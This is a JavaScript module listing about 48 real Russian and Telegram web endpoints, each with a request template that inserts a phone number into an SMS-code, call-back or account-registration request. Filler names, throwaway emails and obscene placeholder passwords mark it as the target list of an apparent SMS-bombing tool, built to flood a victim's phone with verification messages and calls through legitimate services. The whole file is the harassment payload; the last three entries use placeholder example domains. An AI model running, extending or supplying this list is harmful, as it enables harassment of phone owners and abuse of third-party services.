const APIs = [
    {
        name: "rnr42",
        url: "https://rnr42.ru/ajax/mains.php",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest"
        },
        bodyT: (p = "") => `object=bell_order&values=${encodeURIComponent(p)}&key=Max`
    },
    {
        name: "naomisushi-register",
        url: "https://naomisushi.moscow/?action=auth",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest"
        },
        bodyT: (p = "", csrf = "") => `CSRF=${encodeURIComponent(csrf)}&ACTION=REGISTER&MODE=PHONE&PHONE=${encodeURIComponent(p)}&PASSWORD=pidoras1777&PASSWORD2=pidoras1777`
    },
    {
        name: "shozasushi-sendCode",
        url: "https://vsem-edu-oblako.ru/singlemerchant/api/sendConfirmationCode",
        method: "GET",
        headers: { "Accept": "*/*" },
        bodyT: (p = "") => `?device_id=507d0348-a8ba-4b0b-af9d-d9f9ce3d8d3c&device_platform=desktop&merchant_keys=7032fd3fab92189684177cf3b48e66d8&transaction_type=delivery&json=true&lang=ru&frontend=modern&phone=${encodeURIComponent(p)}`
    },
    {
        name: "jacochef-sendsms",
        url: "https://api.jacochef.ru/site/public/index.php/auth",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `number=${encodeURIComponent(p.replace("+7","8").replace(/\D/g,""))}&pwd=%D0%B2%D0%BE%D0%B0%D0%BB%D0%B0%D0%BB%D0%B2%D1%8B%D0%BE%D0%BB%D0%B4%D1%8B%D0%B2%D0%B0%D0%BE%D0%BB&sig=3788d44bcc31ec780630f08cc1147c8480c55f38134332ecb66339e6c8b76a77&ts=1768344701&type=sendsmsrp`
    },
    {
        name: "italianpizza-signup-code",
        url: "https://italanpizza.ru/api/v2/lk/signup/code",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        bodyT: (p = "") => JSON.stringify({phone: p, isSms: true})
    },
    {
        name: "optika-favorit",
        url: "https://www.optika-favorit.ru/local/php_interface/lib/sms/ajax.php",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest"
        },
        bodyT: (p = "") => `PERSONAL_PHONE=${encodeURIComponent(p.replace("+7","+7(").replace(/(\d{3})(\d{3})(\d{2})(\d{2})/,"$1)$2-$3-$4"))}&PERSONAL_SMS_CODE=`
    },
    {
        name: "seenstore",
        url: "https://seenstore.ru/api/v1/c/auth/login",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        bodyT: (p = "") => JSON.stringify({
            "smart-token": null,
            "phone": p.replace("+7","+7 (").replace(/(\d{3})(\d{3})(\d{2})(\d{2})/,"$1) $2-$3-$4")
        })
    },
    {
        name: "optica-ot-gleba",
        url: "https://optica-ot-gleba.ru/wp-content/themes/cleantemplate/mail.php",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `form-name=%D0%97%D0%B0%D0%BA%D0%B0%D0%B7%D0%B0%D1%82%D1%8C+%D0%B7%D0%B2%D0%BE%D0%BD%D0%BE%D0%BA&utm_source=&utm_medium=&utm_campaign=&utm_content=&utm_term=&url=https%3A%2F%2Foptica-ot-gleba.ru%2F&name=Max&tel=${encodeURIComponent(p.replace("+7","+7 ").replace(/(\d{3})(\d{3})(\d{2})(\d{2})/,"($1) $2-$3-$4"))}&accept=on`
    },
    {
        name: "harrycooper",
        url: "https://harrycooper.ru/registrations/check_registr.php",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest"
        },
        bodyT: (p = "") => `reg_phone=${encodeURIComponent(p.replace("+7","+7 ").replace(/(\d{3})(\d{3})(\d{2})(\d{2})/,"($1) $2-$3-$4"))}&reg_code=74378378942789&reg_name=daun&reg_email=superdaun1488%40mail.ru&reg_phones=%2B7+(948)+848-45-84&myRadio=registerRadio`
    },
    {
        name: "votprikid-register",
        url: "https://votprikid.ru/index.php?route=unishop/login_register/register",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest"
        },
        bodyT: (p = "") => `firstname=jfdkjkdf&telephone=${encodeURIComponent(p.replace("+7","+7 (").replace(/(\d{3})(\d{3})(\d{2})(\d{2})/,"$1) $2-$3-$4"))}&email=shjdhjsjahjk%40gmail.com&password=jdfjkdfjkfdjkdssjk&confirm=1`
    },
    {
        name: "slepayakurica",
        url: "https://slepayakurica.ru/local/templates/m/ajax/action.php",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest"
        },
        bodyT: (p = "") => `a=mdl&g=sms-login&dt=${encodeURIComponent(JSON.stringify({
            u: "/lk/",
            t: p.replace("+7","+7 ").replace(/(\d{3})(\d{3})(\d{2})(\d{2})/,"$1 $2 $3 $4")
        }))}`
    },
    {
        name: "zharpizza-login399",
        url: "https://zharpizza.ru/login399",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json"
        },
        bodyT: (p = "") => `phone=${encodeURIComponent(p.replace("+7","").replace(/\D/g,""))}&mfa=PHONE_CALL`
    },
    {
        name: "calltouch-kurtki",
        url: "https://api.calltouch.ru/calls-service/RestAPI/requests/61430/register/",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phoneNumber=${encodeURIComponent(p.replace("+7","+7(").replace(/(\d{3})(\d{3})(\d{2})(\d{2})/,"$1)$2-$3-$4"))}&subject=%D0%97%D0%B0%D1%8F%D0%B2%D0%BA%D0%B0%20%D1%81%20kurtki-i-parki.ru&requestUrl=https%3A%2F%2Fkurtki-i-parki.ru%2Fmsk%2Fkurtki-muzhskie&sessionId=387306088`
    },
    {
        name: "telegram-oauth-presscode",
        url: "https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p)}`
    },
    {
        name: "telegram-translations",
        url: "https://translations.telegram.org/auth/request",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p)}`
    },
    {
        name: "telegram-fragment",
        url: "https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p)}`
    },
    {
        name: "telegram-bot-t",
        url: "https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p)}`
    },
    {
        name: "telegram-off-bot",
        url: "https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p)}`
    },
    {
        name: "telegram-mipped",
        url: "https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p)}`
    },
    {
        name: "telegram-spot-uz",
        url: "https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p)}`
    },
    {
        name: "telegram-tbiz",
        url: "https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p)}`
    },
    {
        name: "telegram-telegrambot-biz",
        url: "https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p)}`
    },
    {
        name: "telegram-store",
        url: "https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p)}`
    },
    {
        name: "telegram-combot",
        url: "https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p)}`
    },
    {
        name: "telegram-my-sendpass",
        url: "https://my.telegram.org/auth/send_password",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p)}`
    },
    {
        name: "cloudbeeline",
        url: "https://cloudbeeline.ru/api/2/accounts/beeline_request_code/",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p.replace("+7","").replace(/\D/g,""))}`
    },
    {
        name: "zaim-express",
        url: "https://lk.zaim-express.ru/Account/RegisterCode",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
        bodyT: (p = "") => `PhoneNumber=${encodeURIComponent(p.replace("+7","").replace(/\D/g,""))}`
    },
    {
        name: "mysbertips",
        url: "https://lk.mysbertips.ru/sbrftips-proxy/registration/start",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        bodyT: (p = "") => JSON.stringify({phone: p.replace("+7","").replace(/\D/g,"")})
    },
    {
        name: "vipavenue",
        url: "https://users.vipavenue.ru/api/auth/send-code",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        bodyT: (p = "") => JSON.stringify({phone: p.replace("+7","").replace(/\D/g,""), type: "call"})
    },
    {
        name: "zonatelecom",
        url: "https://www.zonatelecom.ru/api/identify",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p.replace("+7","").replace(/\D/g,""))}&type=call`
    },
    {
        name: "sputnik24",
        url: "https://sputnik24.tv/register",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p.replace("+7","").replace(/\D/g,""))}`
    },
    {
        name: "tmn-parking",
        url: "https://tmn-parking.ru/api/auth/registration-v2",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        bodyT: (p = "") => JSON.stringify({phone: p.replace("+7","").replace(/\D/g,"")})
    },
    {
        name: "rp55",
        url: "https://rp55.ru/wp-json/contact-form-7/v1/contact-forms/11/feedback",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `tel=${encodeURIComponent(p.replace("+7","+7(").replace(/(\d{3})(\d{3})(\d{2})(\d{2})/,"$1)$2-$3-$4"))}`
    },
    {
        name: "4lapy",
        url: "https://4lapy.ru/ajax/confirmation/phone/send-code",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p.replace("+7","").replace(/\D/g,""))}`
    },
    {
        name: "letu",
        url: "https://www.letu.ru/?mode=register",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `PHONE=${encodeURIComponent(p.replace("+7","").replace(/\D/g,""))}`
    },
    {
        name: "beeline-tv",
        url: "https://rest.beeline.tv/api_v3/service/ottUser/action/login",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        bodyT: (p = "") => JSON.stringify({login: p.replace("+7","").replace(/\D/g,"")})
    },
    {
        name: "kotofey",
        url: "https://kotofey.ru/users/registrate_do/",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p.replace("+7","").replace(/\D/g,""))}`
    },
    {
        name: "svoefermerstvo",
        url: "https://svoefermerstvo.ru/api/ext/rshb-auth/send-verification-code",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        bodyT: (p = "") => JSON.stringify({phone: p.replace("+7","").replace(/\D/g,"")})
    },
    {
        name: "mtsbank",
        url: "https://sso.mtsbank.ru/api/v2/login",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        bodyT: (p = "") => JSON.stringify({phone: p.replace("+7","").replace(/\D/g,"")})
    },
    {
        name: "cdek",
        url: "https://www.cdek.ru/api-site/auth/send-code",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        bodyT: (p = "") => JSON.stringify({phone: p.replace("+7","").replace(/\D/g,"")})
    },
    {
        name: "shoppinglive",
        url: "https://shoppinglive.ru/api/register/send-code",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        bodyT: (p = "") => JSON.stringify({phone: p.replace("+7","").replace(/\D/g,"")})
    },
    {
        name: "dns-shop",
        url: "https://www.dns-shop.ru/api/v1/auth/send/code",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        bodyT: (p = "") => JSON.stringify({phone: p.replace("+7","").replace(/\D/g,"")})
    },
    {
        name: "budzdorov",
        url: "https://budzdorov.ru/api/send-confirm-code",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        bodyT: (p = "") => JSON.stringify({phone: p.replace("+7","").replace(/\D/g,"")})
    },
    {
        name: "pizzapizzburg",
        url: "https://pizzapizzburg.ru/api/register/confirm",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        bodyT: (p = "") => JSON.stringify({phone: p.replace("+7","").replace(/\D/g,"")})
    },
    {
        name: "superpizzaplus",
        url: "https://superpizzaplus.ru/profile/auth/login/",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p.replace("+7","").replace(/\D/g,""))}&type=call`
    },
    {
        name: "api43",
        url: "https://api.example43.com/sms/send",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        bodyT: (p = "") => JSON.stringify({phone: p, message: "verification code"})
    },
    {
        name: "api44",
        url: "https://api.example44.com/auth/code",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        bodyT: (p = "") => `phone=${encodeURIComponent(p)}&action=register`
    },
    {
        name: "api45",
        url: "https://api.example45.com/send",
        method: "GET",
        headers: { "Accept": "application/json" },
        bodyT: (p = "") => `?phone=${encodeURIComponent(p)}&service=sms`
    }
];

module.exports = APIs;
